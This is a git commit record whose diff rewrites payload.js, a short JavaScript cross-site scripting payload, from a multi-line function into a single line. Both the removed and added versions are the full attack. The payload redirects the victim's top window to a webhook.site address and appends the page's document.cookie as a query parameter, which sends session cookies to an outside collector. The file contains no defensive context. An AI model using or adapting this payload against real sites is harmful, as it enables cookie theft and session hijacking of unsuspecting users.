f8c2b558c1bbffd7bf9b166054a63c3a152d9703
michael chan <michael.chan.2009.2@gmail.com>
2026-03-08 19:42:14 +0800

    Add files via upload

--- payload.js
+++ payload.js
@@ -1,4 +1,1 @@
-(() => {
-  const W = "https://webhook.site/d1f8184d-054f-40c2-b6b6-ec4a050d6ac8";
-  top.location = W + "?stage=final&c=" + encodeURIComponent(document.cookie);
-})();
+top.location='https://webhook.site/d1f8184d-054f-40c2-b6b6-ec4a050d6ac8?stage=final&c='+encodeURIComponent(document.cookie);
